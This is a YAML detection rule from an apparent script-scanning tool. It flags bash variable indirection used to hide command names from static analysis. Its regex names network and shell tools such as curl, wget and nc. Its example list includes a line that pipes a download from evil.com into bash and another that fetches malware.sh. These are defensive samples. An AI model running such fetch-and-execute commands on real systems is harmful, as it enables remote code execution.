# Bash Pattern: Variable Indirection and Command Substitution
# Detects suspicious variable indirection patterns

id: BASH-027
name: Variable Indirection Obfuscation
description: |
  Detects use of echo command substitution to assign command names to variables,
  followed by variable expansion to execute commands. This technique is used to
  hide malicious command invocations from static analysis by storing command
  names in variables with innocuous names.
languages:
  - bash
detection_type: regex
detection_logic: '\$\([a-zA-Z_][a-zA-Z0-9_]*\)\s+\$\([a-zA-Z_][a-zA-Z0-9_]*\)|\$[a-zA-Z_][a-zA-Z0-9_]*\s+\$[a-zA-Z_][a-zA-Z0-9_]*\s*\|\s*\$[a-zA-Z_][a-zA-Z0-9_]*|=\$\(echo\s+["\x27](curl|wget|bash|sh|nc|ncat)["\x27]\)'
severity: High
mitre_technique: T1027
confidence: 0.80
category: obfuscation
enabled: true
metadata:
  author: Script Sentinel Team
  created: "2025-11-19"
  updated: "2025-11-19"
  references:
    - "https://attack.mitre.org/techniques/T1027/"
  tags:
    - bash
    - obfuscation
    - variable-indirection
    - command-substitution
  examples:
    - "cmd=$(echo 'curl'); $cmd http://evil.com | bash"
    - "xkcd=$(echo 'wget'); $xkcd malware.sh"
    - "$var1 $var2 | $var3"